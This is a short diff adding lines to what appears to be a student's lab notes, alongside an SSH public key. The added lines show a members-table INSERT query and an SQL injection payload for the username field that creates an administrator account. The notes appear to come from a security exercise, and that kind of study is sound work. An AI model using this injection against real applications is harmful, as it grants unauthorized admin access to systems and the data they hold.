@@ -8,3 +8,10 @@ http://localhost:4444clear
 
 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJUVbs9Sg+b0cYJYaBT71az/Yzhg15GHlxX4Oat+IEPoGAsqCE5B2I6eefQ+y0SMGoAOpGin7QYy5XtlCSwrtoUsAQfCABsGDDg1CpLA95ZcihHw+MMwq85kM0cPu3oInmCz+ZJyVH5xYo2nTwEoaomKpkplDcbplX2ncA36CTj9oWrQUysd2AiKQfwhSGnCBrVGMZsw4FiRG4aQqSbrpm5ap0K5fjvSBKenQxdTrG4etFqnYqSjyGZtw1zw5Bwi4L70rDYxgJJ6lmQRyt65vbJmzE8Z7Wgsk7za7QMBUDmQsxZA9RtpeK6FWO6IDHjwR7jgSYp8BIA1kevwtyZa1R student@lin-ops
+
+
+
+INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('Hacker', 'Man', 'Hacker', 'pass', 'admin@mail.com', 1)
+
+Based off query above, username was vulnerable so how we made a admin account
+Hacker','pass','email@email.com',1)#
